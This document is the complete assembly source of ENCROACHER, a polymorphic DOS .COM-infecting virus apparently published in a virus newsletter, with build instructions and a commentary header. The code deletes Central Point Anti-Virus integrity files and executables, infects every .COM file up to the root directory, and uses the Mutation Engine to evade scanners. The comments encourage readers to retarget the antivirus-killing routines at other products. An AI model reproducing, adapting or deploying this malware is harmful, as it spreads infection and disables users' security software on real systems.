;***************************************************************************
; The ENCROACHER virus: Incorporating anti-virus software countermeasures
; to aid in gaining and maintaining a foothold on a CENTRAL POINT ANTIVIRUS
; protected system. Some of the ideas in ENCROACHER were inspired by Mark
; Ludwig's RETALIATOR virus (American Eagle Publishing) and Nowhere Man's
; VCL 1.0 viral assembly code library. ENCROACHER also utilizes the Mutation
; Engine for polymorphism. Edited by URNST KOUCH for Crypt Newsletter #8.
;
;  1. Assemble with TASM 2.5 with the aid of MAKE.BAT, included in issue #8.
;  2. The reader must also have the MtE091b object files (not included in 
;  the newsletter but commonly available as the Mutation Engine at most
;  good virus info archive sites.) 
;  3. Place all files in ENCROACHER assembly directory. 
;  4. Execute MAKE.BAT with TASM 2.5 and TLINK.EXE in path.
;
; ENCROACHER is a simple .COM appending virus which strikes the Central Point
; Anti-virus software in a direct manner.  CPAV stores a file called 
; chklist.cps in every directory that contains executable programs. This file
; contains the integrity (or checksum) data on each program in that
; directory. It is the library file that CPAV refers to when scanning for
; unknown viruses. By comparing 'newly checksummed' files with its data 
; in chklist.cps, CPAV locates change, corruption or generic virus infection.
; Eliminating these files before virus infection forces Central Point 
; Antivirus to create new 'checklist' data for the directory, AFTER the
; virus has acted.  Therefore, the virus-infected file becomes
; a legal part of Central Point's freshly calculated integrity data.
; Upon call, ENCROACHER will ALWAYS check for and erase these files, forcing
; the anti-virus software to constantly update its data, effectively
; making this feature unreliable.  In my experience,
; the CPAV software does not protest the elimination of these files in an
; appropriate manner.
;
; ENCROACHER will also attempt to erase the main CENTRAL POINT A-V program        
; in its default installation directory before infection.  This is a 
; direct attack and is more likely to be noticed than the
; disappearance and reappearance of dozens of very small chklist.cps
; files. Because it is a strong move, one can be of mixed mind about using it.
; An alert user SHOULD recognize something wrong almost immediately. 
; However, it is included to illustrate the point that while it presumes 
; apriori knowledge concerning the location of CPAV software on the system,  
; many users can STILL be expected to be lazy (and/or stupid) and use the 
; vulnerable shrink-wrapped software recommendations for installation.
;        
; ENCROACHER will also target and delete VSAFE.COM, CPAV's most powerful       
; program for the detection of virus-mediated opening, closing and writing
; to files. (The CPAV software also contains VSAFE as a device, VSAFE.SYS.
; The user may add attack of this component to the source code if he wishes.)
; If Central Point's DEFAULT installation is in place and VSAFE is in        
; memory, ENCROACHER will remove it since, generally, the program
; is merely configured to scan for known viruses, add chklist.cps files
; to program directories and lock out writes to the boot record. If all
; of VSAFE's features are enabled, ENCROACHER WILL BE detected when it
; attempts to destroy VSAFE. However, since these VSAFE features are
; not practical for everyday computing needs, it can be
; assumed relatively safe to disregard them as a threat to ENCROACHER. (The
; reader is invited to add a routine which will make a call to VSAFE
; if in memory. If VSAFE is resident, the routine could be written to
; instruct the virus to go to sleep until the danger is past.)
;        
; Central Point Anti-virus contains a third program known as VWATCH. It
; can be safely ignored by ENCROACHER.
;
; ENCROACHER's anti-virus software countermeasures can be quickly adapted
; to almost any commercial software of choice.  Access to manuals or
; copies of the Norton Antivirus, Fifth Generation's Untouchable or
; Leprechaun Software's Virus-Buster have all the information needed to
; allow the homebrew researcher to reconfigure the virus so that it can 
; attack these programs in an educated manner.
;
; ENCROACHER2 is a variant of ENCROACHER supplied as a DEBUG script. 
; In addition to it's anti- CPAV capability, ENCROACHER2 will poison selected
; programs sometime in the evening hours.
;
; General features: ENCROACHER will infect all .COM programs in its current 
; directory. When finished, it will jump to the root of the current directory
; and continue its work.
; ENCROACHER WILL NOT restore the DTA, producing a shift at the prompt. 
; (Sorry, deadline was approaching for the newsletter and I had to get this
; baby to bed.) 
;        
; ENCROACHER has no problem infecting COMMAND.COM or NDOS.COM!  The operating
; system WILL continue to load properly. ENCROACHER quickly deletes
; Central Point software programs on start-up. There is no noticeable
; delay in infection times between it and a copy of the virus lacking 
; these features.
; ENCROACHER will quickly infect down the trunk of any directory structure.
;
; Keep in mind, that ENCROACHER 2 can be frustratingly destructive once
; it has spread out onto a system.
	
	
	.model  tiny
	.radix  16
	.code

	extrn   mut_engine: near, rnd_get: near, rnd_init: near
	extrn   rnd_buf: word, data_top: near

	org     100h

start:
	call    locadr
reladr:
	db      'ENCROACHER is here'
       
locadr:
	pop     dx
	mov     cl,4
	shr     dx,cl
	sub     dx,10
	mov     cx,ds
	add     cx,dx                   ;Calculate new CS
	mov     dx,offset begin
	push    cx dx
	retf
begin:
	cld
	mov     di,offset start
	push    es di
	push    cs
	pop     ds
	mov     si,offset old_cod
	movsb                           ;Restore first 3 bytes
	movsw
	push    ax
	mov     dx,offset dta_buf       ;Set DTA
	mov     ah,1a
	int     21
	mov     ax,3524                 ;Hook INT 24
	int     21
	push    es bx
	mov     dx,offset fail_err
	mov     ax,2524
	int     21
killcps:              ; clear CPS integrity files from startup directory
	mov     dx,offset killfile      ; DX points to data mask: chklist.cps
	mov     ah,04Eh                 ; DOS find first file function
	mov     cx,00100111b            ; All file attributes valid
	int     021h
	jc      erase_done              ; Exit procedure on failure
	mov     ah,02Fh                 ; DOS get DTA function
	int     021h
	lea     dx,[bx + 01Eh]          ; DX points to filename in DTA
erase_loop:     
	mov     ah,041h                 ; DOS delete file function
	int     021h
	mov     ah,03Ch                 ; DOS create file function
	xor     cx,cx                   ; No attributes for new file
	int     021h
	mov     ah,041h                 ; DOS delete file function
	int     021h
	mov     ah,04Fh                 ; DOS find next file function
	int     021h
	jnc     erase_loop              ; Repeat until no files left
erase_done:


	 jmp     killcpav               ; chklist.cps gone, go for CPAV.EXE
					; in factory installation
	
	
killcpav:              ; clear CPAV master executable from default directory
	mov     dx,offset killfile2    ; DX points to filename
	mov     ah,41h                 ; DOS erase file function
	int     21h
	jc      killvsafe

killvsafe:
	mov     dx,offset killfile3
	mov     ah,41h
	int     21h
	jc      erase_done2

erase_done2:
	jmp     getonwithit
	
getonwithit:                            ;get on with infecting files
	xor     ax,ax                   ;Initialize random number generator
	mov     [rnd_buf],ax            ;for Mutation Engine use
	call    rnd_init
	push    sp
	pop     cx
	sub     cx,sp
	add     cx,4
	push    cx

find_lup1:        
	mov     dx,offset srchnam       ;COMfile mask for clean file search
	mov     cl,3
	mov     ah,4e                   ;find a file

find_lup2:
	int     21        ;Find the next COM file
	jc      ch_dir    ;if no files or no uninfected files in current dir, change to root
	cmp     [dta_buf+1a],ch
	jnz     infect           ;If not infected, infect it now
	pop     cx
find_nxt:
	push    cx
	mov     dx,offset dta_buf
	mov     ah,4f                 ;found an infected file, find another
	jmp     find_lup2

ch_dir:  
	mov     dx,offset dotdot
	mov     ah,3bh              ; Change directory to root of current
	int     21h
	jnc     find_lup1           ; Carry set if in root
				    ; loop to search for clean files
infect_done:
	pop     cx
	loop    find_nxt
	jnc     exit2
	call    rnd_get             ;extraneous garbage code
	test    al,1                ;   "         "      "
	jz      exit2               ;   "         "      "

exit1:  popf                       ;return control and get set to clean up

exit2:
	pop     dx ds
	mov     ax,2524             ;Restore old INT 24
	int     21
	push    ss
	pop     ds
	mov     dx,80                   ;Restore DTA
	mov     ah,1a
	int     21
	push    ds                      ;Exit to host program
	pop     es
	pop     ax
	retf
infect:
	xor     cx,cx                   ;Reset read-only attribute
	mov     dx,offset dta_buf+1e
	mov     ax,4301
	int     21
	jc      infect_done             ;if fail, get set to leave
	mov     ax,3d02                 ;Open the file
	int     21
	jc      infect_done             ;if fail, get set to leave
	xchg    ax,bx
	mov     dx,offset old_cod       ;Read first 3 bytes
	mov     cx,3
	mov     ah,3f
	int     21
	jc      read_done               ;file already infected, skip it
	mov     ax,word ptr [old_cod]   ;Make sure it's not an EXE file
	cmp     ax,'ZM'
	jz      read_done               ;if it is, skip it
	cmp     ax,'MZ'
	jz      read_done
	xor     cx,cx                   ;Seek to end of file
	xor     dx,dx
	mov     ax,4202
	int     21
	test    dx,dx                   ;Make sure the file is not too big
	jnz     read_done
	cmp     ax,-2000
	jnc     read_done
	mov     bp,ax
	sub     ax,3
	mov     word ptr [new_cod+1],ax
	mov     ax,5700                 ;Save file's date/time
	int     21
	push    dx cx
	mov     ax,offset data_top+0f
	mov     cl,4                    ;Now call the Mutation Engine
	shr     ax,cl
	mov     cx,cs
	add     ax,cx
	mov     es,ax
	mov     dx,offset start         ;dx points to start of ENCROACHER
	mov     cx,offset _DATA         ;cx contains ENCROACHER length
	push    bp bx
	add     bp,dx  ;bp contains address where MtE hands control to ENCROACH
	xor     si,si                   ;si=0, MtE required value
	xor     di,di                   ;di=0, MtE required value
	mov     bl,0f                   ;bl=0f,MtE 'medium' model required
	mov     ax,101                  ;set bit-field in ax, MtE values
	call    mut_engine
	pop     bx ax
	add     ax,cx                   ;Make sure file length mod 256 = 0
	neg     ax
	xor     ah,ah
	add     cx,ax
	mov     ah,40                   ;Put the virus into the file
	int     21
	push    cs
	pop     ds
	sub     cx,ax
	xor     dx,dx                   ;Write the JMP instruction
	mov     ax,4200
	int     21
	mov     dx,offset new_cod
	mov     cx,3
	mov     ah,40
	int     21
write_done:
	pop     cx dx                   ;Restore file's date/time
	mov     ax,5701
	int     21
	jmp     read_done2

read_done:
	mov     ah,3e                   ;Close the file
	int     21
	jmp     infect_done             ;in this case, no infection so 
					;try for another search
read_done2:
	mov     ah,3e
	int     21
	jmp     exit1                  ;successfully infected file,
				       ;jump to host execution
fail_err:                              ;Critical error handler
	mov     al,3                   ;protects ENCROACHER from exposing 
	iret                           ;itself on a write-protected disk
				       ;or diskette

srchnam   db      '*.COM',0
killfile  db     'CHKLIST.CPS',0        ;CPAV file integrity data archive
killfile2 db     'C:\CPAV\CPAV.EXE',0   ;default location and name of
					;CPAV master program
killfile3 db     'C:\CPAV\VSAFE.COM',0  ;CPAV r/w resident protection program

old_cod:                               ;Buffer to read first 3 bytes
	ret
	dw      ?

new_cod:                               ;Buffer to write first 3 bytes
	jmp     $+100

	.data

dotdot  db      '..',0                 ;change directory trick
dta_buf db      2bh dup(?)             ;Buffer for DTA

	end     start
